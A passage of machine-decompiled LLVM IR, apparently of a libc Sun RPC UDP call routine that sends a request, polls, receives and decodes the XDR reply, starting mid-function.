  store i32 %v0_16c00, i32* %r0.global-to-local, align 4
  %v1_16c0c = add i32 %v3_16c00, 4
  %v2_16c0c = inttoptr i32 %v1_16c0c to i32*
  %v3_16c0c = load i32, i32* %v2_16c0c, align 4
  call void @__pseudo_branch(i32 %v3_16c0c)
  %v0_16c10 = load i32, i32* %r0.global-to-local, align 4
  %v2_16c10 = icmp eq i32 %v0_16c10, 0
  br i1 %v2_16c10, label %dec_label_pc_16c60, label %dec_label_pc_16c18

dec_label_pc_16c18:                               ; preds = %dec_label_pc_16bc8
  %v2_16c20 = load i32, i32* %arg1, align 4
  store i32 %v2_16c20, i32* %r3.global-to-local, align 4
  store i32 %v2_16c20, i32* %r0.global-to-local, align 4
  %v1_16c2c = add i32 %v2_16c20, 32
  %v2_16c2c = inttoptr i32 %v1_16c2c to i32*
  %v3_16c2c = load i32, i32* %v2_16c2c, align 4
  store i32 %v3_16c2c, i32* %r3.global-to-local, align 4
  %v1_16c34 = add i32 %v3_16c2c, 4
  %v2_16c34 = inttoptr i32 %v1_16c34 to i32*
  %v3_16c34 = load i32, i32* %v2_16c34, align 4
  call void @__pseudo_branch(i32 %v3_16c34)
  %v0_16c38 = load i32, i32* %r0.global-to-local, align 4
  %v2_16c38 = icmp eq i32 %v0_16c38, 0
  br i1 %v2_16c38, label %dec_label_pc_16c60, label %dec_label_pc_16c40

dec_label_pc_16c40:                               ; preds = %dec_label_pc_16c18
  %v0_16c44 = load i32, i32* @r8, align 4
  store i32 %v0_16c44, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v0_16c58 = load i32, i32* %r0.global-to-local, align 4
  %v2_16c58 = icmp eq i32 %v0_16c58, 0
  br i1 %v2_16c58, label %dec_label_pc_16c60, label %dec_label_pc_16c68

dec_label_pc_16c60:                               ; preds = %dec_label_pc_16c40, %dec_label_pc_16c18, %dec_label_pc_16bc8
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b6c

dec_label_pc_16c68:                               ; preds = %dec_label_pc_16c40
  %v0_16c68 = load i32, i32* @r8, align 4
  %v1_16c68 = add i32 %v0_16c68, 4
  %v2_16c68 = inttoptr i32 %v1_16c68 to i32*
  %v3_16c68 = load i32, i32* %v2_16c68, align 4
  store i32 %v3_16c68, i32* %r3.global-to-local, align 4
  store i32 %v0_16c68, i32* %r0.global-to-local, align 4
  %v1_16c74 = add i32 %v3_16c68, 16
  %v2_16c74 = inttoptr i32 %v1_16c74 to i32*
  %v3_16c74 = load i32, i32* %v2_16c74, align 4
  call void @__pseudo_branch(i32 %v3_16c74)
  %v0_16c78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16c78, i32* %sb.global-to-local, align 4
  %v0_16c7c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16c7c

dec_label_pc_16c7c:                               ; preds = %dec_label_pc_16e54, %dec_label_pc_16e3c, %dec_label_pc_16c68
  %v0_16c8c = phi i32 [ %v0_16dd4, %dec_label_pc_16e3c ], [ %v0_16dd4, %dec_label_pc_16e54 ], [ %v0_16c7c.pre, %dec_label_pc_16c68 ]
  %stack_var_-9024.1 = phi i32 [ %stack_var_-9024.3.lcssa, %dec_label_pc_16e3c ], [ %storemerge7, %dec_label_pc_16e54 ], [ %stack_var_-9024.0, %dec_label_pc_16c68 ]
  %stack_var_-9028.1 = phi i32 [ %v0_16e5c, %dec_label_pc_16e3c ], [ %v0_16e5c, %dec_label_pc_16e54 ], [ %stack_var_-9028.0, %dec_label_pc_16c68 ]
  %v1_16c7c = add i32 %v0_16c8c, 8
  store i32 %v1_16c7c, i32* %r3.global-to-local, align 4
  %v1_16c80 = inttoptr i32 %v0_16c8c to i32*
  %v2_16c80 = load i32, i32* %v1_16c80, align 4
  store i32 %v2_16c80, i32* @r0, align 4
  %v1_16c84 = add i32 %v0_16c8c, 88
  %v2_16c84 = inttoptr i32 %v1_16c84 to i32*
  %v3_16c84 = load i32, i32* %v2_16c84, align 4
  store i32 %v3_16c84, i32* @r1, align 4
  %v1_16c8c = add i32 %v0_16c8c, 24
  %v2_16c8c = inttoptr i32 %v1_16c8c to i32*
  %v3_16c8c = load i32, i32* %v2_16c8c, align 4
  store i32 %v3_16c8c, i32* %ip.global-to-local, align 4
  %v0_16c90 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16c90, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v6_16c9c = call i32 @__libc_sendto(i32 %v2_16c80, i32 %v3_16c84, i32 %v0_16c90, i32 0, i32 %v1_16c7c, i32 %v3_16c8c)
  store i32 %v6_16c9c, i32* %r0.global-to-local, align 4
  %v9_16ca0 = icmp eq i32 %v6_16c9c, %v0_16c90
  br i1 %v9_16ca0, label %dec_label_pc_16ca8, label %dec_label_pc_16b58

dec_label_pc_16ca8:                               ; preds = %dec_label_pc_16c7c
  store i32 %storemerge7, i32* %ip.global-to-local, align 4
  br i1 %v2_16cb0, label %dec_label_pc_16cb8, label %dec_label_pc_16cc8

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16ca8
  store i32 %storemerge6, i32* %r0.global-to-local, align 4
  br i1 %v2_16cc0, label %dec_label_pc_16b68, label %dec_label_pc_16cc8

dec_label_pc_16cc8:                               ; preds = %dec_label_pc_16ca8, %dec_label_pc_16cb8, %dec_label_pc_16bb4
  %stack_var_-9024.2 = phi i32 [ %stack_var_-9024.0, %dec_label_pc_16bb4 ], [ %stack_var_-9024.1, %dec_label_pc_16cb8 ], [ %stack_var_-9024.1, %dec_label_pc_16ca8 ]
  %stack_var_-9028.2 = phi i32 [ %stack_var_-9028.0, %dec_label_pc_16bb4 ], [ %stack_var_-9028.1, %dec_label_pc_16cb8 ], [ %stack_var_-9028.1, %dec_label_pc_16ca8 ]
  %v2_16ccc = load i32, i32* @global_var_302f0.870, align 4
  store i32 %v2_16ccc, i32* %r0.global-to-local, align 4
  %v5_16ccc = load i32, i32* @global_var_302f4.871, align 4
  store i32 %v2_16cd0, i32* %r3.global-to-local, align 4
  store i32 %v2_16ccc, i32* %stack_var_-196, align 4
  %v0_16ce8 = load i32, i32* @r6, align 4
  %v1_16ce8 = inttoptr i32 %v0_16ce8 to i32*
  %v2_16ce8 = load i32, i32* %v1_16ce8, align 4
  store i32 %v2_16ce8, i32* %stack_var_-56, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d00

dec_label_pc_16d00:                               ; preds = %dec_label_pc_17034, %dec_label_pc_1706c, %dec_label_pc_17054, %dec_label_pc_17040, %dec_label_pc_16cc8
  store i32 %v2_16ae4, i32* %r3.global-to-local, align 4
  store i32 %v2_16d04, i32* %r0.global-to-local, align 4
  %v4_16d10 = call i32 @__libc_poll(%pollfd* %v3_16d10, i32 1, i32 %v2_16b2c)
  store i32 %v4_16d10, i32* %r0.global-to-local, align 4
  %v7_16d14 = icmp eq i32 %v4_16d10, -1
  br i1 %v7_16d14, label %dec_label_pc_17040, label %dec_label_pc_16d1c

dec_label_pc_16d1c:                               ; preds = %dec_label_pc_16d00
  %v2_16d1c = icmp eq i32 %v4_16d10, 0
  br i1 %v2_16d1c, label %dec_label_pc_16d24, label %dec_label_pc_16e78

dec_label_pc_16d24:                               ; preds = %dec_label_pc_16d1c
  %v0_16d24 = load i32, i32* @r6, align 4
  %v1_16d24 = inttoptr i32 %v0_16d24 to i32*
  %v2_16d24 = load i32, i32* %v1_16d24, align 4
  store i32 %v2_16d24, i32* @sl, align 4
  store i32 8800, i32* %r3.global-to-local, align 4
  store i32 %v2_16eb8, i32* %ip.global-to-local, align 4
  store i32 %v2_16d24, i32* @r0, align 4
  store i8* inttoptr (i32 8800 to i8*), i8** %stack_var_-72, align 4
  %v3_16d4c = call i32 @ioctl(i32 %v2_16d24, i32 35090, i32 %v2_16d40)
  store i32 %v3_16d4c, i32* %r0.global-to-local, align 4
  %v2_16d50 = icmp eq i32 %v3_16d4c, 0
  br i1 %v2_16d50, label %dec_label_pc_16d58, label %dec_label_pc_16dc8

dec_label_pc_16d58:                               ; preds = %dec_label_pc_16d24
  %v2_16d5c = load i8*, i8** %stack_var_-72, align 4
  %v3_16d5c = ptrtoint i8* %v2_16d5c to i32
  store i32 %v3_16d5c, i32* %r3.global-to-local, align 4
  store i32 %v2_16eb8, i32* @r4, align 4
  %v3_16d60 = udiv i32 %v3_16d5c, 32
  %tmp146 = icmp ult i8* %v2_16d5c, inttoptr (i32 32 to i8*)
  store i32 %v2_16dbc, i32* %ip.global-to-local, align 4
  %v1_16dc0135 = add nsw i32 %v3_16d60, -1
  store i32 %v1_16dc0135, i32* @r7, align 4
  br i1 %tmp146, label %dec_label_pc_16dc8, label %dec_label_pc_16d68

dec_label_pc_16d68:                               ; preds = %dec_label_pc_16d58, %dec_label_pc_16db4
  %v0_16d68137 = phi i32 [ %v1_16db4, %dec_label_pc_16db4 ], [ %v2_16eb8, %dec_label_pc_16d58 ]
  %v1_16d6c = inttoptr i32 %v0_16d68137 to i32*
  %v2_16d6c = load i32, i32* %v1_16d6c, align 4
  store i32 %v2_16d6c, i32* %r0.global-to-local, align 4
  %v9_16d6c = add i32 %v0_16d68137, 12
  %v10_16d6c = inttoptr i32 %v9_16d6c to i32*
  %v11_16d6c = load i32, i32* %v10_16d6c, align 4
  store i32 %v11_16d6c, i32* %r3.global-to-local, align 4
  %v12_16d6c = add i32 %v0_16d68137, 16
  store i32 %v12_16d6c, i32* @r5, align 4
  store i32 %v2_16d6c, i32* %stack_var_-160, align 4
  store i32 %v13_16d70, i32* %ip.global-to-local, align 4
  %v1_16d74 = inttoptr i32 %v12_16d6c to i32*
  %v2_16d74 = load i32, i32* %v1_16d74, align 4
  store i32 %v2_16d74, i32* %r0.global-to-local, align 4
  %v9_16d74 = add i32 %v0_16d68137, 28
  %v10_16d74 = inttoptr i32 %v9_16d74 to i32*
  %v11_16d74 = load i32, i32* %v10_16d74, align 4
  store i32 %v11_16d74, i32* %r3.global-to-local, align 4
  %v4_16d78 = trunc i32 %v2_16d74 to i8
  store i8 %v4_16d78, i8* %stack_var_-144, align 1
  %v0_16d7c = load i32, i32* @sl, align 4
  store i32 %v0_16d7c, i32* @r0, align 4
  %v3_16d88 = call i32 @ioctl(i32 %v0_16d7c, i32 35091, i32 %v2_16dbc)
  store i32 %v3_16d88, i32* %r0.global-to-local, align 4
  %v1_16d8c = icmp slt i32 %v3_16d88, 0
  br i1 %v1_16d8c, label %dec_label_pc_16dc8, label %dec_label_pc_16d94

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d68
  %v3_16d94 = load i8, i8* %stack_var_-144, align 1
  %v4_16d94 = sext i8 %v3_16d94 to i32
  store i32 %v4_16d94, i32* %r3.global-to-local, align 4
  %v1_16d98 = urem i32 %v4_16d94, 2
  %v2_16d98 = icmp eq i32 %v1_16d98, 0
  br i1 %v2_16d98, label %dec_label_pc_16d94.dec_label_pc_16db4_crit_edge, label %dec_label_pc_16da0

dec_label_pc_16d94.dec_label_pc_16db4_crit_edge:  ; preds = %dec_label_pc_16d94
  %v0_16db4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16db4

dec_label_pc_16da0:                               ; preds = %dec_label_pc_16d94
  %v0_16da0 = load i32, i32* @r5, align 4
  %v1_16da0 = add i32 %v0_16da0, 1
  %v2_16da0 = inttoptr i32 %v1_16da0 to i8*
  %v3_16da0 = load i8, i8* %v2_16da0, align 1
  %v4_16da0 = zext i8 %v3_16da0 to i32
  %v0_16da4 = load i32, i32* @r4, align 4
  %v1_16da4 = add i32 %v0_16da4, 16
  %v2_16da4 = inttoptr i32 %v1_16da4 to i8*
  %v3_16da4 = load i8, i8* %v2_16da4, align 1
  %v4_16da4 = zext i8 %v3_16da4 to i32
  %v4_16da8 = mul nuw nsw i32 %v4_16da0, 256
  %v5_16da8 = or i32 %v4_16da4, %v4_16da8
  store i32 %v5_16da8, i32* %r3.global-to-local, align 4
  %v7_16dac = icmp eq i32 %v5_16da8, 2
  br i1 %v7_16dac, label %dec_label_pc_16dd0, label %dec_label_pc_16db4

dec_label_pc_16db4:                               ; preds = %dec_label_pc_16d94.dec_label_pc_16db4_crit_edge, %dec_label_pc_16da0
  %v0_16db4 = phi i32 [ %v0_16db4.pre, %dec_label_pc_16d94.dec_label_pc_16db4_crit_edge ], [ %v0_16da4, %dec_label_pc_16da0 ]
  %v1_16db4 = add i32 %v0_16db4, 32
  store i32 %v1_16db4, i32* @r4, align 4
  %v0_16db8.pre = load i32, i32* @r7, align 4
  store i32 %v2_16dbc, i32* %ip.global-to-local, align 4
  %v1_16dc0 = add i32 %v0_16db8.pre, -1
  store i32 %v1_16dc0, i32* @r7, align 4
  %tmp114 = icmp slt i32 %v0_16db8.pre, 1
  br i1 %tmp114, label %dec_label_pc_16dc8, label %dec_label_pc_16d68

dec_label_pc_16dc8:                               ; preds = %dec_label_pc_16d24, %dec_label_pc_16d58, %dec_label_pc_16d68, %dec_label_pc_16db4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b6c

dec_label_pc_16dd0:                               ; preds = %dec_label_pc_16da0
  store i32 %v2_16ae4, i32* %ip.global-to-local, align 4
  %v0_16dd4 = load i32, i32* @r6, align 4
  %v1_16dd4 = add i32 %v0_16dd4, 28
  %v2_16dd4 = inttoptr i32 %v1_16dd4 to i32*
  %v3_16dd4 = load i32, i32* %v2_16dd4, align 4
  store i32 %v3_16dd4, i32* %r3.global-to-local, align 4
  %v2_16ddc = add i32 %v3_16dd4, %stack_var_-9024.2
  store i32 %v2_16ddc, i32* %r0.global-to-local, align 4
  store i32 %v2_16ae4, i32* %ip.global-to-local, align 4
  %v1_16de4 = add i32 %v0_16dd4, 32
  %v2_16de4 = inttoptr i32 %v1_16de4 to i32*
  %v3_16de4 = load i32, i32* %v2_16de4, align 4
  store i32 %stack_var_-9028.2, i32* %r0.global-to-local, align 4
  %v2_16df0 = add i32 %v3_16de4, %stack_var_-9028.2
  store i32 999999, i32* %r3.global-to-local, align 4
  store i32 %v2_16df0, i32* %ip.global-to-local, align 4
  %v8_16e3829 = icmp sgt i32 %v2_16df0, 999999
  br i1 %v8_16e3829, label %dec_label_pc_16dfc.lr.ph, label %dec_label_pc_16e3c

dec_label_pc_16dfc.lr.ph:                         ; preds = %dec_label_pc_16dd0
  %tmp116 = add i32 %stack_var_-9028.2, -1000000
  %tmp117 = add i32 %tmp116, %v3_16de4
  %tmp118 = udiv i32 %tmp117, 1000000
  %tmp121 = add i32 %v2_16ddc, 1
  %tmp123 = add i32 %tmp121, %tmp118
  %tmp147 = mul i32 %tmp118, -1000000
  %tmp124 = add i32 %tmp117, %tmp147
  store i32 999999, i32* %r3.global-to-local, align 4
  store i32 %tmp124, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16e3c

dec_label_pc_16e3c:                               ; preds = %dec_label_pc_16dfc.lr.ph, %dec_label_pc_16dd0
  %stack_var_-9024.3.lcssa = phi i32 [ %tmp123, %dec_label_pc_16dfc.lr.ph ], [ %v2_16ddc, %dec_label_pc_16dd0 ]
  %v0_16e5c = phi i32 [ %tmp124, %dec_label_pc_16dfc.lr.ph ], [ %v2_16df0, %dec_label_pc_16dd0 ]
  store i32 %storemerge7, i32* %r0.global-to-local, align 4
  %v5_16e4c = icmp slt i32 %stack_var_-9024.3.lcssa, %storemerge7
  br i1 %v5_16e4c, label %dec_label_pc_16c7c, label %dec_label_pc_16e50

dec_label_pc_16e50:                               ; preds = %dec_label_pc_16e3c
  %v9_16e48 = icmp eq i32 %stack_var_-9024.3.lcssa, %storemerge7
  br i1 %v9_16e48, label %dec_label_pc_16e54, label %dec_label_pc_16b68

dec_label_pc_16e54:                               ; preds = %dec_label_pc_16e50
  %v5_16e60 = icmp slt i32 %v0_16e5c, %storemerge6
  br i1 %v5_16e60, label %dec_label_pc_16c7c, label %dec_label_pc_16b68

dec_label_pc_16e78:                               ; preds = %dec_label_pc_16d1c
  store i32 %v4_16e78, i32* %r3.global-to-local, align 4
  br i1 %v2_16e7c, label %dec_label_pc_16fec, label %dec_label_pc_16e84

dec_label_pc_16e84:                               ; preds = %dec_label_pc_16e78
  store i32 %v2_16e98, i32* %r0.global-to-local, align 4
  store i32 %v34_16ad4, i32* %ip.global-to-local, align 4
  store i32 %v2_16e98, i32* %v4_16ea8, align 4
  store i32 %v2_16eb8, i32* @r4, align 4
  %v0_16ecc = load i32, i32* @sp, align 4
  %v1_16edc = add i32 %v0_16ecc, 264
  store i32 %v1_16edc, i32* @r7, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i32 %v2_16eb8, i32* @r1, align 4
  %v0_16ef8 = load i32, i32* @r6, align 4
  %v1_16ef8 = inttoptr i32 %v0_16ef8 to i32*
  %v2_16ef8 = load i32, i32* %v1_16ef8, align 4
  store i32 %v2_16ef8, i32* @r0, align 4
  store i32 8192, i32* @r2, align 4
  %v3_16f00 = call i32 @__libc_recvmsg(i32 %v2_16ef8, i32 %v2_16eb8, i32 8192)
  store i32 %v3_16f00, i32* %r0.global-to-local, align 4
  %v1_16f04 = icmp slt i32 %v3_16f00, 0
  br i1 %v1_16f04, label %dec_label_pc_16fec, label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16e84
  %v0_16f0c = load i32, i32* @r7, align 4
  store i32 %v0_16f0c, i32* %r0.global-to-local, align 4
  %v0_16f10 = load i32, i32* @r6, align 4
  %v1_16f10 = add i32 %v0_16f10, 88
  %v2_16f10 = inttoptr i32 %v1_16f10 to i32*
  %v3_16f10 = load i32, i32* %v2_16f10, align 4
  store i32 %v3_16f10, i32* @r1, align 4
  %v3_16f18 = inttoptr i32 %v0_16f0c to i8*
  %v4_16f18 = call i32 @bcmp(i8* %v3_16f18, i32 %v3_16f10, i32 %v3_16f00)
  store i32 %v4_16f18, i32* %r0.global-to-local, align 4
  store i32 %v4_16f18, i32* @r7, align 4
  %v2_16f1c = icmp eq i32 %v4_16f18, 0
  br i1 %v2_16f1c, label %dec_label_pc_16f24, label %dec_label_pc_16fec

dec_label_pc_16f24:                               ; preds = %dec_label_pc_16f0c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16fec

dec_label_pc_16fec:                               ; preds = %dec_label_pc_16f24, %dec_label_pc_16f0c, %dec_label_pc_16e84, %dec_label_pc_16e78, %dec_label_pc_17024
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 %v2_16ff4, i32* %ip.global-to-local, align 4
  %v0_16ff8 = load i32, i32* @r6, align 4
  %v1_16ff8 = add i32 %v0_16ff8, 96
  store i32 %v1_16ff8, i32* @r5, align 4
  %v1_16ffc = inttoptr i32 %v0_16ff8 to i32*
  %v2_16ffc = load i32, i32* %v1_16ffc, align 4
  store i32 %v2_16ffc, i32* @r0, align 4
  %v1_17000 = add i32 %v0_16ff8, 92
  %v2_17000 = inttoptr i32 %v1_17000 to i32*
  %v3_17000 = load i32, i32* %v2_17000, align 4
  store i32 %v3_17000, i32* @r2, align 4
  store i32 %v1_16ff8, i32* @r1, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v2_17010, i32* %ip.global-to-local, align 4
  %v6_17018 = call i32 @__libc_recvfrom(i32 %v2_16ffc, i32 %v1_16ff8, i32 %v3_17000, i32 0, i32 %v2_16ff4, i32 %v2_17010)
  store i32 %v6_17018, i32* %r0.global-to-local, align 4
  %v1_1701c = icmp slt i32 %v6_17018, 0
  br i1 %v1_1701c, label %dec_label_pc_17024, label %dec_label_pc_17054

dec_label_pc_17024:                               ; preds = %dec_label_pc_16fec
  %v0_17024 = call i32 @__errno_location()
  store i32 %v0_17024, i32* %r0.global-to-local, align 4
  %v1_17028 = inttoptr i32 %v0_17024 to i32*
  %v2_17028 = load i32, i32* %v1_17028, align 4
  store i32 %v2_17028, i32* %r3.global-to-local, align 4
  %v7_1702c = icmp eq i32 %v2_17028, 4
  br i1 %v7_1702c, label %dec_label_pc_16fec, label %dec_label_pc_17034

dec_label_pc_17034:                               ; preds = %dec_label_pc_17024
  %v0_17034 = call i32 @__errno_location()
  store i32 %v0_17034, i32* %r0.global-to-local, align 4
  %v1_17038 = inttoptr i32 %v0_17034 to i32*
  %v2_17038 = load i32, i32* %v1_17038, align 4
  store i32 %v2_17038, i32* %r0.global-to-local, align 4
  %v7_1703c = icmp eq i32 %v2_17038, 11
  br i1 %v7_1703c, label %dec_label_pc_16d00, label %dec_label_pc_17044

dec_label_pc_17040:                               ; preds = %dec_label_pc_16d00
  %v0_16e68 = call i32 @__errno_location()
  store i32 %v0_16e68, i32* %r0.global-to-local, align 4
  %v1_16e6c = inttoptr i32 %v0_16e68 to i32*
  %v2_16e6c = load i32, i32* %v1_16e6c, align 4
  store i32 %v2_16e6c, i32* %r0.global-to-local, align 4
  %v7_16e70 = icmp eq i32 %v2_16e6c, 4
  br i1 %v7_16e70, label %dec_label_pc_16d00, label %dec_label_pc_17044

dec_label_pc_17044:                               ; preds = %dec_label_pc_17034, %dec_label_pc_17040
  %v0_1704c = phi i32 [ %v2_17038, %dec_label_pc_17034 ], [ %v2_16e6c, %dec_label_pc_17040 ]
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v1_1704c = load i32, i32* @r6, align 4
  %v2_1704c = add i32 %v1_1704c, 48
  %v3_1704c = inttoptr i32 %v2_1704c to i32*
  store i32 %v0_1704c, i32* %v3_1704c, align 4
  br label %dec_label_pc_16b70

dec_label_pc_17054:                               ; preds = %dec_label_pc_16fec
  %v7_17058 = icmp slt i32 %v6_17018, 4
  br i1 %v7_17058, label %dec_label_pc_16d00, label %dec_label_pc_1705c

dec_label_pc_1705c:                               ; preds = %dec_label_pc_17054
  br i1 %v2_16bbc, label %dec_label_pc_17080, label %dec_label_pc_1706c

dec_label_pc_1706c:                               ; preds = %dec_label_pc_1705c
  %v0_1706c = load i32, i32* @r6, align 4
  %v1_1706c = add i32 %v0_1706c, 88
  %v2_1706c = inttoptr i32 %v1_1706c to i32*
  %v3_1706c = load i32, i32* %v2_1706c, align 4
  store i32 %v3_1706c, i32* %r3.global-to-local, align 4
  %v1_17070 = inttoptr i32 %v3_1706c to i32*
  %v2_17070 = load i32, i32* %v1_17070, align 4
  %v1_17074 = add i32 %v0_1706c, 96
  %v2_17074 = inttoptr i32 %v1_17074 to i32*
  %v3_17074 = load i32, i32* %v2_17074, align 4
  store i32 %v3_17074, i32* %r3.global-to-local, align 4
  %v9_17078 = icmp eq i32 %v3_17074, %v2_17070
  br i1 %v9_17078, label %dec_label_pc_17080, label %dec_label_pc_16d00

dec_label_pc_17080:                               ; preds = %dec_label_pc_1706c, %dec_label_pc_1705c
  store i32 %v2_17080, i32* @r4, align 4
  %v0_17084 = load i32, i32* @r5, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v2_17080, i32* %r0.global-to-local, align 4
  store i32 %v2_17094, i32* @r5, align 4
  %v10_17098 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-128, i32 %v0_17084, i32 %v6_17018, i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_17080, i32* %r0.global-to-local, align 4
  %v2_170a4 = call i32 @__GI_xdr_replymsg(i32 %v2_17080, i32 %v2_17094)
  store i32 %v2_170a4, i32* %r0.global-to-local, align 4
  %v2_170a8 = icmp eq i32 %v2_170a4, 0
  br i1 %v2_170a8, label %dec_label_pc_17170, label %dec_label_pc_170b0

dec_label_pc_170b0:                               ; preds = %dec_label_pc_17080
  store i32 %v2_17094, i32* %r0.global-to-local, align 4
  %v0_170b4 = load i32, i32* @r6, align 4
  %v1_170b4 = add i32 %v0_170b4, 44
  %v2_170b8 = inttoptr i32 %v1_170b4 to i32*
  %v3_170b8 = call i32 @__GI__seterr_reply(i32 %v2_17094, i32* %v2_170b8)
  store i32 %v3_170b8, i32* %r0.global-to-local, align 4
  %v0_170bc = load i32, i32* @r6, align 4
  %v1_170bc = add i32 %v0_170bc, 44
  %v2_170bc = inttoptr i32 %v1_170bc to i32*
  %v3_170bc = load i32, i32* %v2_170bc, align 4
  store i32 %v3_170bc, i32* %r3.global-to-local, align 4
  %v2_170c0 = icmp eq i32 %v3_170bc, 0
  br i1 %v2_170c0, label %dec_label_pc_170c8, label %dec_label_pc_17124

dec_label_pc_170c8:                               ; preds = %dec_label_pc_170b0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %v2_170d0 = load i32, i32* %arg1, align 4
  store i32 %v2_170d0, i32* %r3.global-to-local, align 4
  store i32 %v2_16cd0, i32* @r4, align 4
  store i32 %v2_170d0, i32* %r0.global-to-local, align 4
  %v1_170e0 = add i32 %v2_170d0, 32
  %v2_170e0 = inttoptr i32 %v1_170e0 to i32*
  %v3_170e0 = load i32, i32* %v2_170e0, align 4
  store i32 %v3_170e0, i32* %r3.global-to-local, align 4
  store i32 94444, i32* @lr, align 4
  %v1_170e8 = add i32 %v3_170e0, 8
  %v2_170e8 = inttoptr i32 %v1_170e8 to i32*
  %v3_170e8 = load i32, i32* %v2_170e8, align 4
  call void @__pseudo_branch(i32 %v3_170e8)
  %v0_170ec = load i32, i32* %r0.global-to-local, align 4
  %v2_170ec = icmp eq i32 %v0_170ec, 0
  br i1 %v2_170ec, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_170c8
  %v2_170f4 = load i32, i32* @r6, align 4
  %v3_170f4 = add i32 %v2_170f4, 44
  %v4_170f4 = inttoptr i32 %v3_170f4 to i32*
  store i32 7, i32* %v4_170f4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_170fc = load i32, i32* @r6, align 4
  %v3_170fc = add i32 %v2_170fc, 48
  %v4_170fc = inttoptr i32 %v3_170fc to i32*
  store i32 6, i32* %v4_170fc, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_170c8, %bb
  store i32 %v5_16ccc, i32* %r3.global-to-local, align 4
  %v2_17104 = icmp eq i32 %v5_16ccc, 0
  br i1 %v2_17104, label %dec_label_pc_17178, label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %.thread10
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_17110 = load i32, i32* @r8, align 4
  %v2_17110 = inttoptr i32 %v1_17110 to i32*
  store i32 2, i32* %v2_17110, align 4
  %v0_17114 = load i32, i32* @r8, align 4
  store i32 %v0_17114, i32* @r0, align 4
  store i32 %v2_16cd0, i32* @r1, align 4
  %v0_1711c = call i32 @xdr_opaque_auth()
  store i32 %v0_1711c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17178

dec_label_pc_17124:                               ; preds = %dec_label_pc_170b0
  store i32 %stack_var_-9032.0, i32* %r0.global-to-local, align 4
  %tmp126 = icmp slt i32 %stack_var_-9032.0, 1
  br i1 %tmp126, label %dec_label_pc_17178, label %dec_label_pc_17134

dec_label_pc_17134:                               ; preds = %dec_label_pc_17124
  %v2_1713c = load i32, i32* %arg1, align 4
  store i32 %v2_1713c, i32* %r3.global-to-local, align 4
  store i32 %v2_1713c, i32* %r0.global-to-local, align 4
  %v1_17144 = add i32 %v2_1713c, 32
  %v2_17144 = inttoptr i32 %v1_17144 to i32*
  %v3_17144 = load i32, i32* %v2_17144, align 4
  store i32 %v3_17144, i32* %r3.global-to-local, align 4
  %v1_1714c = add i32 %v3_17144, 12
  %v2_1714c = inttoptr i32 %v1_1714c to i32*
  %v3_1714c = load i32, i32* %v2_1714c, align 4
  call void @__pseudo_branch(i32 %v3_1714c)
  %v0_17150 = load i32, i32* %r0.global-to-local, align 4
  %v2_17150 = icmp eq i32 %v0_17150, 0
  br i1 %v2_17150, label %dec_label_pc_17178, label %dec_label_pc_17158

dec_label_pc_17158:                               ; preds = %dec_label_pc_17134
  %v1_17160 = add i32 %stack_var_-9032.0, -1
  store i32 %v1_17160, i32* %r3.global-to-local, align 4
  %v0_16bc0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16bb4

dec_label_pc_17170:                               ; preds = %dec_label_pc_17080
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_17174 = load i32, i32* @r6, align 4
  %v2_17174 = add i32 %v1_17174, 44
  %v3_17174 = inttoptr i32 %v2_17174 to i32*
  store i32 2, i32* %v3_17174, align 4
  br label %dec_label_pc_17178

dec_label_pc_17178:                               ; preds = %dec_label_pc_17134, %dec_label_pc_17124, %.thread10, %dec_label_pc_1710c, %dec_label_pc_17170
  %v0_17178 = load i32, i32* @r6, align 4
  %v1_17178 = add i32 %v0_17178, 44
  %v2_17178 = inttoptr i32 %v1_17178 to i32*
  %v3_17178 = load i32, i32* %v2_17178, align 4
  store i32 %v3_17178, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1717c

dec_label_pc_1717c:                               ; preds = %dec_label_pc_16b70, %dec_label_pc_17178
  %v0_1717c = phi i32 [ %v0_1717c.pre, %dec_label_pc_16b70 ], [ %v3_17178, %dec_label_pc_17178 ]
  store i32 %v0_1717c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1717c

; uselistorder directives
  uselistorder i32 %v0_1717c, { 1, 0 }
  uselistorder i32 %v1_17160, { 1, 0 }
  uselistorder i32 %v1_16ff8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-9024.3.lcssa, { 1, 0, 2 }
  uselistorder i32 %tmp124, { 1, 0 }
  uselistorder i32 %v3_16de4, { 1, 0 }
  uselistorder i32 %v0_16dd4, { 2, 3, 1, 0 }
